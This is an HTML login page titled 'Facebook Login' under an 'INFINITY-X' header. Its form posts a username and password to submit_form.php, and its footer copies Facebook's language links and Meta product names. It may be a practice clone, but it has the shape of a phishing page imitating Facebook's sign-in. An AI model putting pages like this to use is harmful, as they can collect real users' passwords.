<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="index.css">
</head>
<body>
  <!-- Header -->
  <header>
    <h2>INFINITY-X</h2>
  </header>

  <!-- Login Form -->
  <form action="submit_form.php" method="POST" class="login-form">
    <fieldset>
      <legend>To register</legend>
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" placeholder="Enter your username" required>
      
      <label for="password">Password:</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required>
      
      <label for="country">Choose your country:</label>
      <select id="country" name="country" required>
        <option value="country">Choose your country</option>
        <option value="india">INDIA</option>
        <option value="usa">USA</option>
        <option value="britain">BRITAIN</option>
        <option value="australia">AUSTRALIA</option>
        <option value="canada">CANADA</option>
        <option value="russia">RUSSIA</option>
      </select>

      <button type="submit" class="submit-button">Sign in</button>
      <button class="create-account-button">To create an account</button>
    </fieldset>
  </form>

  <!-- Footer -->
  <footer>
    <p> हिन्दी | ਪੰਜਾਬੀ | اردو | বাংলা | ગુજરાતી | தமிழ் | తెలుగు | മലയാളം | ಕನ್ನಡ | English (UK)</p>
    <hr>
    <div>
      Messenger | Facebook Lite | Marketplace | Meta Pay | Meta Quest | Ray-Ban Meta | © 2024
    </div>
  </footer>

  <script src="index.js"></script>
</body>
</html>
